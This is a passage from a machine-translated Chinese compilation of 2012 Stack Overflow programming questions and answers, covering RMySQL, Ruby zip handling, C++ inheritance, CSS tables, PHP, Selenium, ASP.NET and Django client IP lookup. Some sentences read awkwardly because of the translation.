数据将存储在使用宏创建的宏表中。如果更改 中的公式中`A1`的值，则 中的值会`B1`自动更新。

这也可以通过将数据存储在自定义名称中来适应 putstruct / getstruct 方法，`mystruct.data1`并且可以将工作簿保存为插件，以便可以从任何工作簿访问这些函数。

# mysql - 如何在带有时间戳的 RMySQL 中选择除上周以外的所有数据？

> ID：13076219
> 
> 赞同：0
> 
> 时间：2012-10-25T19:55:21.550
> 
> 标签：mysql, r, rmysql

我在表 A 中有此列“时间戳”，我想选择除上周之外的所有数据，这是我的 R 代码，但弹出错误提示“函数错误（类、fdef、mtable）：无法找到函数“dbWriteTable”的继承方法，用于签名“MySQLConnection”、“data.frame”、“character””，任何帮助将不胜感激？谢谢你。

```
fun <- function(con, dat.set, tbl.name) {

if (dbExistsTable(con, tbl.name)) {     
BFWeek = dbGetQuery(con, statement=paste("SELECT * FROM A",
"WHERE timestamp < timestampadd(day, -7, now())"))   
dbWriteTable(con, BFWeek, tbl.name, row.names=F, append=T);            

} else { 
dbWriteTable(con, tbl.name, dat.set, row.names=F, append=T); 
  }
} 

fun(conn_table, df, "A") 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T00:26:58.713

表的名称必须位于要写入该表的数据框*之前。*在`else`您的代码部分中，您似乎有正确的顺序，但在`if`您`BFWeek`之前的部分`tbl.name`中，它应该在它之后的位置。

```
> showMethods("dbWriteTable")
Function: dbWriteTable (package DBI)
conn="MySQLConnection", name="character", value="character"
conn="MySQLConnection", name="character", value="data.frame" 
```

这会让您了解哪些方法可用，哪些方法不可用。

# c# - 访问共享点上的 TFS 文件

> ID：13076222
> 
> 赞同：0
> 
> 时间：2012-10-25T19:55:36.610
> 
> 标签：c#, sharepoint-2010, web-parts, tfs-sdk

我有一个在 sharepoint server 2010 站点上运行的 sharepoint webpart，它作为团队项目门户，因为它与 TFS 2010 集成。webpart 成功部署到该站点，我能够看到它。

使用 TfsConfigurationServer 类，我可以连接到 TFS 并获取所有项目集合的列表。如果我再往下走 1 步，我可以获得每个集合中所有团队项目的列表。当我尝试连接到版本控制服务器进行收藏时，我的问题就出现了。我想连接到版本控制服务器，以便获取该项目集合下的文件夹/文件列表。

```
 TfsTeamProjectCollection teamProjectCollection = configurationServer.GetTeamProjectCollection(collectionId);
try
   {
     VersionControlServer versionControl = (VersionControlServer)teamProjectCollection.GetService(typeof(VersionControlServer));
     TeamProject tp = versionControl.GetTeamProject("MyTeamProject");
     RecursionType recursion = RecursionType.Full;
     ItemSet itemSet = tp.VersionControlServer.GetItems(tp.ToString(), recursion);
     Item[] items = itemSet.Items;
     foreach (Item item in items)
     {
        l = new Label();
        l.Text = item.ChangesetId.ToString();
        this.Controls.Add(l);
     }
   }
   catch (Exception ex)
   {
     ex.ToString();
   } 
```

上面的代码在 Try 块之后的第一行“versioncontrolserver”行失败。错误提示“重新验证时不允许更改用户”。为什么它试图改变用户？用户帐户（我的）可以访问 sharepoint 和 tfs。如果我添加一个 WindowsIdentity 变量，并在调试中使用断点运行，我可以确认 webpart 在我的用户帐户下运行。由于它在 versioncontrolserver 行上失败，因此在连接到 tfs 系统时似乎正在重新进行身份验证。如果是切换帐户，为什么会这样？它试图使用什么帐户？

# ruby - Ruby：读取临时 zip 文件

> ID：13076224
> 
> 赞同：5
> 
> 时间：2012-10-25T19:55:51.943
> 
> 标签：ruby, zip, temporary-files

我有`TempFile`一个 zip 文件的对象，我希望从中读取如下内容：

```
Zip::ZipFile.open_buffer(tempfile) do |zipfile|
    ...
end 
```

但是，当我这样做时，我收到以下错误：

```
Zip::ZipFile.open_buffer expects an argument of class String or IO. Found: Tempfile 
```

我也试过

```
Zip::ZipFile.open(tempfile.path) do |zipfile|
    ...
end 
```

但这又回来了

```
can't dup NilClass 
```

如何处理临时 zip 文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:03:16.013

请参阅以下文章[http://info.michael-simons.eu/2008/01/21/using-rubyzip-to-create-zip-files-on-the-fly/](http://info.michael-simons.eu/2008/01/21/using-rubyzip-to-create-zip-files-on-the-fly/)它解释了如何使用更基本的界面 Zip ::ZipOutputStream 如果您使用 Tempfile

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T10:01:03.323

原来是临时文件损坏了，所以

```
can't dup NilClass 
```

错误是由于尝试读取损坏的文件造成的。

因此解决方案是使用

```
Zip::ZipFile.open(tempfile.path) do |zipfile|
    ...
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-30T19:03:16.980

我遇到了同样的错误，但在挖掘后我发现这些 zip 文件应该是二进制文件

即，首先将它们以二进制模式复制到某个文件，然后您可以使用 ZIP 模块将其解压缩而不会遇到错误

示例代码

```
#copying zip file to a new file in binary mode

filename = "empty.zip" 
File.open(filename, "wb") do |empty_file|
  open("#{zipfile_url}", 'rb') do |read_file|
    empty_file.write(read_file.read)
  end
end

#now you can open the zip file

Zip::File.open(filename) do |f|
  . . .
end 
```

# c# - AutoMapper 中的 ConstructUsingServiceLocator

> ID：13076226
> 
> 赞同：1
> 
> 时间：2012-10-25T19:55:54.813
> 
> 标签：c#, automapper

我在 AutoMapper 中找到了一个方法：`IMappingExpression.ConstructUsingServiceLocator()`.

我应该什么时候使用这种方法，它和它有什么区别`ConstructUsing`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:36:13.320

它用于配置 AutoMapper 以使用某些构造函数来实例化一个类。

```
Mapper.Initialize(cfg =>
    {
        // Adding "Construct" configuration 
        cfg.ConstructServicesUsing(t => new Dest(5));

        // Tell AutoMapper to use already defined configuration to construct Dest class
        cfg.CreateMap<Source, Dest>()
           .ConstructUsingServiceLocator();
    }); 
```

学习 AutoMapper 的最好方法是查看[单元测试](https://github.com/AutoMapper/AutoMapper/tree/master/src/UnitTests)。

# html - CSS 将表重置为默认等效项

> ID：13076227
> 
> 赞同：13
> 
> 时间：2012-10-25T19:55:54.407
> 
> 标签：html, css, css-tables

我正在使用预先制作的购买模板，其中所述模板的作者以这样一种方式将事物连接在一起，有时几乎不可能以您想要的方式获得某些东西，在这种情况下，我有一张我想放的桌子在模板的一部分中，我不需要或不希望按照他们让模板执行的方式设置样式。然而，由于他们是如何做到的，我不能仅仅改变 CSS 来做其他事情。我曾尝试将桌子归类为其他东西并按照我想要的方式对其进行造型，但有些东西总是设法在某个地方被卡住，而作者的风格仍然存在于一张或另一张桌子上。因此，我想出了这个想法，为什么不对特定于表的类进行重置，我可以首先在元素上调用这个类，然后是我希望它在下面设置样式的类，例如：

`class="reset_table mynew_style"`

所以我试图想出一种方法来做到这一点，但我被卡住了。

```
.reset_table, 
.reset_table table tr,
.reset_table tr td,
.reset_table table tbody,
.reset_table table thead,
.reset_table table tfoot,
.reset_table table tr th,
.reset_table table tfoot tr tf
{
    margin:0;
    padding:0;
    background:none;
    border:none;
    border-collapse:collapse;
    border-spacing:0;
    background-image:none;
} 
```

现在这似乎几乎完全有效，仍然有一些事情持续存在。所以我希望这里有人可以帮助我想出一个更好的变体。因此，在尝试将表格重置为正常默认样式的意义上，所有基础都被涵盖了。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2015-01-08T23:10:03.150

It's an old thread, but in case this is helps someone else:

```
.clear-user-agent-styles table,
.clear-user-agent-styles thead,
.clear-user-agent-styles tbody,
.clear-user-agent-styles tfoot,
.clear-user-agent-styles tr,
.clear-user-agent-styles th,
.clear-user-agent-styles td {
    display: block;
    width: auto;
    height: auto;
    margin: 0;
    padding: 0;
    border: none;
    border-collapse: inherit;
    border-spacing: 0;
    border-color: inherit;
    vertical-align: inherit;
    text-align: left;
    font-weight: inherit;
    -webkit-border-horizontal-spacing: 0;
    -webkit-border-vertical-spacing: 0;
}
th, td {
    display: inline;
} 
```

If it's still not overriding other dev styles, make sure you have this code after theirs, or be more specific by including the parent class, or even ID if you need to. Try, to avoid appending *!important* to the end of each property's value, but that would mostly likely trump what was coded previously.

# c++ - 派生类 C++

> ID：13076228
> 
> 赞同：1
> 
> 时间：2012-10-25T19:55:55.623
> 
> 标签：c++, class, inheritance, derived-class

我正在开发一个基于文本的游戏以获得乐趣，并且我正在努力从基类继承。我有我的基类`Being`，它包含我创建的任何角色的所有统计数据。然后我有一个班级`Combat`，我想从`Being`（或从一个存在并将其传递到战斗中？）的所有统计数据并做所有的战斗工作。但我不太了解继承，或者至少如何声明函数`Main`以使其工作。如果我将攻击函数保留在 中`Being`，我可以在 main 中写下这一行：

```
human.attack(monster); 
```

但是在将战斗分成另一个类之后，我不确定如何在 main 中编写它以便它工作。请并感谢您的帮助！

```
class Being // Base Class
{
public:

    string name, nameSpecialAttack; // Implement a special attack feature,
                                    // that has a specific mutliplier #
                                    // unique to each being
    int attackBonus, attackMod; // was a float attackMod method for casting
                                // spells that double or halve a Being’s
                                // attack power.
    int baseDamage; // base damage
    int health, healthMax; // current health and max health
    int mp, mpMax; // current mp and max mp
    int arrows; // change to [ranged?] ammo

    Being(); // Default Constructor
    Being(string name, string nameSpecialAttack, int attackBonus,
          int attackMod, int baseDamage, int health, int healthMax,
          int mp, int mpMax, int arrows); // Constructor 2
    // All my set and get functions
} 
```

然后我的派生类：

```
class Combat : public Being
{
private:

public:

    void attack(Being& target);

}; 
```

战斗.cpp：

```
void Combat::attack(Being& target)
{
    //unsigned seed = time(0);
    //srand(seed); 
    // Rand # 0-99, * damage+1, /100, * attackMod, parse to int.
    int damage = (int)(attackMod*( ( (rand()%100)*(baseDamage+1) /100) + attackBonus + (rand()%2))); 
    target.health -=damage;

    cout << name << " attacks " << target.name << " doing " << damage << " damage!" << endl;
    cout << target.name << "'s health: " << target.health << endl;

    // Use getHealth() instead and put this function there
    if(target.health <= 0)
    {
        cout << endl << name << " killed " << target.name << "! You have won the game! " << endl << endl;
        cout << "Terminating AMnew World, Good Bye.\n" << endl << endl;
        exit(0);
    }
} 
```

主要的：

```
Being human("", "FirstofFurry", 2, 1, 2, 50, 50, 20, 30, 7); // A thing of
                                                             // class Being
Being monster("Armored Goblin", "Rawr", 2, 1, 2, 65, 59, 20, 20, 6);

int main()
{
    human.attack(monster); // No longer works since attack is in
                           // combat class now
    Sleep(3000);
    cout << endl << endl;
    monster.attack(human);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:10:04.297

除非以下情况属实，否则您似乎在这里没有正确地利用继承：

在你的游戏中，可以攻击的生物和不能攻击的生物是有区别的。话虽如此，更改继承层次结构可能很有用。

考虑让你继承的“类型”。

前任：

```
class Being
{
public:
    virtual void attack(...) = 0;
};

class Human : public Being
{
public:
    virtual void attack(...); // Overrides attack in a manner that humans generally would
};

class Goblin : public Being
{
public:
    virtual void attack(...); // Goblin attack style. This is actually a decent way to handle different types of attacks, as in the special attack in your above definition
}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T20:23:08.587

这不会是你想要继承的东西，战斗不会是一种存在。例如，苹果是一种水果，因此水果基类和苹果派生类在逻辑上是正确的。我建议创建一个 Enemy 类和一个 Hero 类，从敌人身上衍生出僵尸和忍者等怪物。

```
#include <iostream>
#include <cmath>
#include <string>
using namespace std;

class Character
{
    public:
    Character(){}     //does nothing, just represents the heros class
};

class Enemy
{
    private:
        int Health;         //base class variables
        int WeaponID;
    public:
        Enemy(int hp, int wpID);
        virtual void Attack(Character& Target); //if all monsters have same attack, no need for virtual
        //etc...etc...
};

class Zombie:public Enemy               //DERIVED CLASS, uses base class attack method
{
    public:
        Zombie(int hp, int wpID):
            Enemy(hp,wpID)
        {}
};

class Ninja: public Enemy               //DERIVED CLASS, uses its own attack method
{
    private:
        int NumThrowingKnives;
    public:
        Ninja(int Hp , int ID) : Enemy(Hp,ID)
        {}
        void Attack(Character& Target); //different attack
        //etc..etc..

};

Enemy::Enemy(int hp, int wpID)
{
    Health = hp;
    WeaponID = wpID;
}

void Ninja::Attack(Character& Target)
{
    cout << "Ninja attack!" << endl;
}

void Enemy::Attack(Character& Target)
{
    cout << "Base class attack!" << endl;
}

int main()
{
    Character Bob;
    Ninja Bill(50,12);
    Zombie Rob(50,16);
    Bill.Attack(Bob);
    cout << endl;
    Rob.Attack(Bob);

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:01:34.420

为什么不声明`human`为 type`Combat`呢？

```
Combat human("", "FirstofFurry", 2, 1, 2, 50, 50, 20, 30, 7); 
```

它仍然可以访问 的所有公共方法/数据`Being`，但也可以使用`Combat`-only`attack`方法。

# javascript - 使用 JavaScript 在 Galaxy 平板电脑上自动滚动

> ID：13076230
> 
> 赞同：4
> 
> 时间：2012-10-25T19:56:04.143
> 
> 标签：javascript, android, scroll

我正在构建一个主要用于三星 Galaxy Tab 的应用程序。应用程序中有一个长表格。该表单占用平板电脑的整个屏幕，因此选择一个字段时 - 键盘的一半表格覆盖。我希望能够将网页向右滚动到他们选择的输入字段所在的位置。

我尝试了 2 个解决方案：

[1](http://demos.flesler.com/jquery/scrollTo/)

```
var href = window.location.href;
href = href.split("#")[0];
href = href + '#' + element.id;
window.location.href = href; 
```

[2]

jQuery 插件：[jQuery.ScrollTo](http://demos.flesler.com/jquery/scrollTo/)

这两种解决方案在台式机/笔记本电脑浏览器上都运行良好，但在 Galaxy 平板电脑浏览器中似乎没有任何效果。有人有想法么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T18:00:56.250

首先，我会`$(htmlInputSelector)[0].focus()`在给定的 html 元素上尝试方法。

如果这不起作用，请尝试：

```
 var myJqObj = $(htmlInputSelector);
    var hTop = myJqObj.offset().top;
    var hLeft = myJqObj.offset().left;
    window.scrollTo(hLeft, hTop); 
```

# ios - 核心数据：子类 NSManagedObject 和关系

> ID：13076232
> 
> 赞同：1
> 
> 时间：2012-10-25T19:56:06.217
> 
> 标签：ios, core-data, nsmanagedobject

我将 NSManagedObjects 子类化为 Person 和 Company。在核心数据中，我使用两种方式建立了这些关系（一种从个人到公司，称为 personCompany，另一种是 companyPerson）。我的应用程序很好地保存了个人和公司，它们的头文件如下所示（为了演示目的进行了大量简化）：

```
#import <CoreData/CoreData.h>

@interface BBPerson : NSManagedObject

@property (nonatomic) NSString *firstName;
@property (nonatomic) NSString *lastName;

@end

----------------------

#import <CoreData/CoreData.h>

@interface BBCompanyName : NSManagedObject

@property (nonatomic) NSString *companyName;

@end 
```

在我的“添加人员”视图控制器中，部分保存方法如下。

```
 //If this is a new person, best add a person
    if (!currentPerson) {
        currentPerson = [NSEntityDescription insertNewObjectForEntityForName:@"Person"
                                                         inManagedObjectContext:managedObjectContext];
    }

    //Write the values back to the entity

    currentPerson.firstName = txtFirstName.text;
    currentPerson.lastName = txtLastName.text;

**//I WANT TO DO THE BELOW: but clearly can't**    
//[currentPerson setCompany:selectedCompany];.

    //Save back to core data
    NSError *error;
    if (![managedObjectContext save:&error]) {
        NSLog(@"Failed to save - error: %@", [error localizedDescription]);
    } 
```

如果我在这里引用了另一家公司（上面显示为 selectedCompany），我如何更改我的子类 NSManagedObject 以添加此关系？我查看[了文档](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreData/Articles/cdUsingMOs.html#//apple_ref/doc/uid/TP40001803-CJBDBHCB)，但我仍然有点飘忽不定。

我想用我的子类 NSManagedObject 创建一个可以持久的关系。类似 [currentPerson setCompany:selectedCompany]; 这当然需要 currentPerson 一个方法 - 这个方法看起来如何？

我想做的是能够在应用程序的后期阶段为公司召集所有人员。我确实考虑过使用谓词和外键并抛弃关系来做到这一点，但那是我让自己误以为这是一个数据库，但事实并非如此。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:26:03.153

您想在核心数据编辑器中设置实体（当您在项目导航器中选择 xcdatamodel 时出现）。

为 Person 和 Company 实体添加名称、电话号码等属性。

然后对于公司实体，在关系下，添加名称为 people 的关系，destination Person。选择该关系后，在数据模型检查器窗格中，勾选表示多对关系的框。对于 Person 实体，添加一个名为 company 的关系，将其目标设置为 Company，并将其反向设置为 people。

从项目导航器中删除您的 NSManagedObjectModel 子类。创建一个新文件并从左侧菜单中选择 Core Data。选择托管对象子类。它将询问您要为其生成实体的数据模型。选择您的数据模型和要为其生成 NSManagedObject 子类的实体（个人和公司）。

然后，您可以查看 Xcode 为您创建的头文件和实现文件，您将看到您为实体设置的属性已在头文件中声明为属性，并且在实现中它们都被标记为动态。更重要的是，对于 Company 和 Person 之间的一对多关系也是如此。您将在 Company.h 中看到 Company 有一个 @property people，它是一个 NSSet。这在您的实现中也被标记为@dynamic。@dynamic 不会像 @synthesize 那样为您创建 getter 和 setter，但您仍然可以为它们使用点表示法。

另外，请注意核心数据会为您生成一些访问器方法。

# php - 重新解析文本文件中的数据

> ID：13076233
> 
> 赞同：0
> 
> 时间：2012-10-25T19:56:12.857
> 
> 标签：php, html, pcre

好的，我知道它已经有一段时间了，我不确定我是否应该开始一个新线程

但我已经想出了如何删除以删除两个中间部分，所有括号和 srgba，以及零 alpha 的行，但不知何故它在文本文件中留下了一个开放空间。如果有任何人都可以看到的任何改进。

```
$fh = fopen("pcmanD.txt", "r");
$fg = fopen("pcmanJ.txt", "wt");
$new_array = ""; $parts = "";
while (!feof($fh)) {
    $line = fgets($fh);
    $lines[] = $line;
    $newword = "";
    $match1 ="/:\s?\s?\(\s?\s?\d+,\s?\s?\d+,\s?\s?\d+,\s?\s?\d+\)\s?\s?#[a-zA-Z0-9]{6,8}\s?\s?srgba/";
    $match2 ="/^\s\s?/";
    $match3 = "/\s\(/";
    $match4 = "/\)/";
    $match5 = "/[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},0[^\.]/";

    $parts1 = preg_replace($match1,"", $line );
    $parts2 = preg_replace($match2,"", $parts1 );
    $parts3 = preg_replace($match3,",", $parts2 );
    $parts4 = preg_replace($match4,"", $parts3 );
    $parts5 = preg_replace($match5,"",$parts4);

    echo "<pre>";
    print_r($parts5);
    echo "</pre>";

    fwrite($fg, $parts5);
} 

fclose($fg);
fclose($fh); 
```

但是这段代码出现了新问题，我在比赛后的浮点数上得到了两倍或三倍。

```
$thisisit[] = "";
$thisisit2[] = "";
$countThis = 0;
$fh = fopen("sometext.txt", "r");
$new_array = ""; $parts = "";
while (!feof($fh)) {
    $line = fgets($fh);
    $line2 = $line;
    $newword = "";
    $match1 ="/^\s*?[\d]+,[\d]+/";
    $parts1 = preg_match($match1, $line, $regs);
    foreach($regs as $key => $lame) {
        $thisisit[] = $lame;
    }
    $match2 ="/(?:(\d{1,3},\d{1,3},))(\d{1,3},\d{1,3},\d{1,3},[01][\.]?[\d]*)/";
    $parts2 = preg_match($match2, $line2, $regs2);
    foreach($regs2 as $key2 => $lame2) {
        $thisisit2[] =$lame2;
    }
    $countLame = count($thisisit);
} 

echo "</script>";
$newCounter = 0;
for($i = 0; $i < (500); $i++) {
    echo  $thisisit[$i] . "<br />";
    echo $thisisit2[$newCounter] . "<br />" ;
    $newCounter = $newCounter +4;
}
fclose($fh); 
```

这是我正在处理的文本文件中的一些文本

```
42,23,162,166,48,0.156863
 43,23,162,166,47,0.156863
 44,23,167,170,67,0.219608
 45,23,162,166,47,0.156863
 46,23,167,170,67,0.219608
 47,23,162,166,37,0.117647
 48,23,162,167,32,0.0941176
                                      86,23,163,167,40,0.12549
 87,23,160,164,47,0.164706
 88,23,188,190,122,0.352941
 86,24,233,234,197,0.486275
 87,24,251,250,250,1
 88,24,251,250,250,1
 89,24,251,250,250,1 
```

# php - ajax调用后PHP“重新需要”文件

> ID：13076234
> 
> 赞同：1
> 
> 时间：2012-10-25T19:56:13.327
> 
> 标签：php, ajax

在我的 index.php 文件中，我首先需要一些文件并使用 php.. 连接到数据库。

```
<?php

// Require every .php file inside "phpClasses" folder
foreach (glob("phpScripts/*.php") as $filename) {
require $filename;
}

// Create the $db object
$db = Database::obtain(DB_SERVER, DB_USER, DB_PASS, DB_DATABASE); 

// Connect to the database
$db->connect();

// Instantiate the "language" and "databaseQuery" classes
$lang = new language();     
$dbQuery = new databaseQuery();     

// Detect if the laguage has changed from the user and apply the new "current language"
if(isset($_GET["change_lang"])) {
    $change_lang = $_GET["change_lang"];
    $cur_lang = $change_lang;
} else {
    $cur_lang = $lang->getCurLang();
}
?> 
```

在同一个文件中，我包含“home.php”文件以显示数据库内容。

```
<div id="cur_content" class="temp_content" data-tempPos="0">
        <?php 
            include 'pages/home.php'; 
        ?>
    </div>  <!-- #cur_content --> 
```

在“home.php”文件中，我重新创建 $dbQuery 类并调用 getText() 函数，如下所示：

```
<?php

$dbQuery = new databaseQuery();         

?>

<div id="content_home" class="cur_content_inner"> 

  <?php
$text_pos = 'home_inner_1';
    $dbQuery->getText($text_pos, $cur_lang);
  ?>

</div> 
```

'index.php' 保持不刷新，用户通过 ajax 调用导航。新内容加载到 #cur_content div 中，删除之前的内容。

在第一次加载页面时一切正常，但是当再次请求“home.php”时（没有刷新 index.php），我收到 php 错误，因为最初的“要求”没有发生。

在 ajax 调用之后，我怎样才能再次需要这些文件？

对不起，但我是新手！;) 感谢每一个帮助！

问题已解决-> [http://codeigniter.com/forums/viewthread/59450/](http://codeigniter.com/forums/viewthread/59450/)

我用这个：

```
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH']=="XMLHttpRequest") {
    foreach (glob("phpScripts/*.php") as $filename) {
        require_once $filename;
    }

    // Create the $db object
    $db = Database::obtain(DB_SERVER, DB_USER, DB_PASS, DB_DATABASE); 

    // Connect to the database
    $db->connect();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:39:18.133

你需要做的是这样的事情：

把这个片段放在一个单独的文件中，比如说`includes.php`

```
// Require every .php file inside "phpClasses" folder
foreach (glob("phpScripts/*.php") as $filename) {
  require $filename;
} 
```

现在从 index.php 中删除它并添加`includes.php`到所有导航页面中，包括`home.php`

# selenium - Selenium WebDriver - 不应该发生的 StaleElementReferenceException

> ID：13076236
> 
> 赞同：2
> 
> 时间：2012-10-25T19:56:16.997
> 
> 标签：selenium, webdriver

我正在 Internet Explorer 中尝试一些最初针对 Chrome 开发的脚本（并且在那里工作得很好），并发现 StaleElementReferenceExceptions 似乎是常态。显然这是因为 IE 太慢了？

据我了解，当您找到 WebElement，然后 DOM 发生更改，然后您尝试对该 WebElement 执行某些操作时，就会发生这些异常，这会使 Selenium 感到困惑，因为页面现在已更改并且 WebElement 中的引用不再有效。如果这就是 StaleElementReferenceExceptions 发生的原因，那么我不知道为什么我会看到这个。

我有一个带有 Flash 播放器的新窗口，在 Flash 播放器播放视频后，我尝试从对象中获取一些参数。页面源代码看起来有点像这样：

```
<object id="flashContent" width="100%" height="100%" type="application/x-shockwave-flash" name="flashContent" data="[redacted]" style="visibility: visible;">
    <param name="scale" value="noscale">
    <param name="wmode" value="opaque">
    <param name="allowfullscreen" value="true">
    <param name="allowscriptaccess" value="always">
    <param name="bgcolor" value="">
    <param name="SeamlessTabbing" value="false">
    <param name="flashvars" value="[redacted]">
</object> 
```

我有兴趣阅读 flashvars 参数的值，所以我有以下代码：

```
text = driver.findElement(By.cssSelector("object#flashContent param[name='flashvars']")).getAttribute("value"); 
```

因此，我似乎无法缩短找到参数 WebElement 和获取其属性之间的时间，而 getAttribute 每次都抛出 StaleElementReferenceException 。我已经打开了页面源代码并观察了窗口——据我所知，没有任何变化。我尝试在一段时间内捕获异常，然后重试，希望我会遇到 DOM 安静且 WebElement 稳定的时间，但以下代码对我一点帮助都没有：

```
 timer.start();
    while (true) {
        try {
            text = getDriver().findElement(By.cssSelector("object#flashContent param[name='flashvars']"))
                    .getAttribute("value");
            break;
        } catch (StaleElementReferenceException e) {
            if (timer.getElapsedSeconds() >= 20) {
                debug("getAttribute is borked, throwing up...");
                throw e;
            } else {
                debug("getAttribute failed again but we're still trying after " + timer.getElapsedMilliseconds() + " milliseconds.");
            }
        }
    } 
```

上面的设计旨在即使抛出 StaleElementReferenceException 也继续尝试 find/getAttribute 组合，直到 findElement 调用通常超时（隐式超时 20 秒）。运行它的结果是 findElement 调用成功，然后 getAttribute 调用在整整 20 秒内每隔 50 毫秒左右抛出一个 StaleElementReferenceException；然后它倾倒了。在这段时间里，页面上没有发生任何事情，至少我看不到。

关于 WebElement 在这种情况下为什么或如何过时的任何想法？

**编辑：**我找到了一种解决方法，仅适用于您尝试仅从页面获取数据的情况（即，从页面获取属性或文本，而不是单击或发送击键）。我的代码已经使用了一个名为[JSoup](http://jsoup.org/)的库来将 DOM 读入内存，如果您需要导航 DOM 并查找信息但又想避免对 DOM 本身进行一系列低性能的 Selenium 查找操作，这将非常方便。使用 JSoup，我能够读取 DOM 的静态版本并提取我寻找的信息。但是，如果我发现自己处于想要单击或发送密钥的情况下，这种解决方法将毫无用处，所以我仍然想知道是否还有其他选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-01T21:40:09.420

StaleElementReferenceException 是由您的代码试图定位 DOM 中不再存在的内容引起的。如果您使用 JSoup 访问旧的静态版本的 DOM，则 Flash 视频结束后的 DOM 内容可能不再包含 flashvars 参数和/或其值属性。使用最快的代码选项，您的初始方法是正确的：

```
 String text = driver.findElement(By.cssSelector("object#flashContentparam[name='flashvars']")).getAttribute("value"); 
```

等待视频结束后 DOM 中出现指示视频已结束的元素，然后尝试查找 flashvars 参数及其 value 属性。PS：StaleElementReferenceException 很少是由快速完整或部分 (AJAX) 页面刷新（<500 ms）引起的，通常是算法问题。

# asp.net - 在后面的 aspx 代码中找不到 HTML 按钮

> ID：13076253
> 
> 赞同：0
> 
> 时间：2012-10-25T19:57:15.037
> 
> 标签：asp.net

我的 aspx 表单上有以下 HTML 按钮，

```
<input type=button onclick="" value="change" id="btnChange" runat="server"> 
```

我正在尝试按照代码在后面的代码中找到我的 HTML 按钮，但它不起作用，

```
Button b1=(Button)Page.findcontrol("btnChange");
b1.visible=false; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:00:42.760

由于这是一个服务器端控件，您应该能够简单地`btnChange`直接使用来引用它。

```
btnChange.Visible = false; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:07:20.877

那不是按钮

```
 HtmlInputButton b1 = (HtmlInputButton) Page.findcontrol("btnChange");
 b1.visible=false; 
```

既然你已经添加了一个`runat="server"`，你应该试试 Visual Studio 的智能感知——它会带来它

```
 btnChange.Visible = true; //should be recognized in code-behind 
```

# javascript - CSS隐藏表格并显示一个tr

> ID：13076254
> 
> 赞同：0
> 
> 时间：2012-10-25T19:57:16.213
> 
> 标签：javascript, css, visibility, css-tables

我想在加载时隐藏一个表并根据类名显示它的一个子 td 。可以用CSS来做吗？

我试图这样做，但我认为它继承自 display:none; 隐藏的表。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T20:01:01.440

如果隐藏表格，表格中的所有内容都将被隐藏。

你想隐藏所有的`<tr>`s 并且只显示每个班级

```
tr{
  display:none;
}
tr.showInit{
  display:table-row;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-25T19:59:17.273

您不能显示隐藏父母的孩子。

但是，您可以隐藏所有其他`<td>`-s 并仅显示您需要的一个。

```
<style>
td { display: none }
td.shown { display: table-cell }
</style>

<table>
    <tr>
        <td> hidden </td>
        <td> hidden </td>
    </tr>
    <tr>
        <td class="shown"> shown </td>
        <td> hidden </td>
    </tr>
    <tr>
        <td> hidden </td>
        <td> hidden </td>
    </tr>
</table> 
```

[**演示**](http://jsfiddle.net/Tpchh/)

* * *

**更新**

使用 JavaScript

```
var tds = document.getElementsByTagName("td");

for ( var i = 0, size = tds.length; i < size; i++ ) {
    if ( !hasClass( tds[i], "shown" ) ) {
        tds[i].style.display = "none";
    }
}

function hasClass(element, cls) {
    return (' ' + element.className + ' ').indexOf(' ' + cls + ' ') > -1;
} 
```

[**演示**](http://jsfiddle.net/Tpchh/1/)

[`hasClass()`](https://stackoverflow.com/a/5898748/1499781)功能

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T19:59:54.013

您不能显示**孩子**并隐藏**父母** ..这是不可能的。

而是隐藏所有 你不想显示的**td ..**

# django - 如何获得“真实”的用户 IP 地址？

> ID：13076259
> 
> 赞同：1
> 
> 时间：2012-10-25T19:57:46.497
> 
> 标签：django, geoip

我试图获取“真实”用户 ip 地址，它正在工作，但我没有得到自己的 ip（真实的），用谷歌地图检查 ip，将其转换为 long-lat 后，谷歌地图显示我的 ISP 的位置。

```
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip 
```

我想要做的是显示来自用户发送文章的确切位置的地图。

任何的想法？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:00:42.250

服务器端唯一可用的方法是 IP，它将始终解析为您的 ISP。

更高级的方法存在安全风险，因此会提示用户允许它们（因此只有客户端可用）。查看 HTML5 GEO 了解更多信息：

[http://html5demos.com/geo](http://html5demos.com/geo)

[http://dev.w3.org/geo/api/spec-source.html](http://dev.w3.org/geo/api/spec-source.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:01:18.517

你将无法得到比这更精确的东西。报告的 IP 地址是正确的，但 IP 地址位置取决于 ISP。对于台式电脑来说，这是最好的。

您当前正在检索的 IP 是您的应用程序接收到的 IP，对于所有网络应用程序都知道，那就是您，但您可能在代理或 VPN 之后，而应用程序永远不会知道。

# php - PEAR 返回路径

> ID：13076260
> 
> 赞同：1
> 
> 时间：2012-10-25T19:57:48.837
> 
> 标签：php, pear, return-path

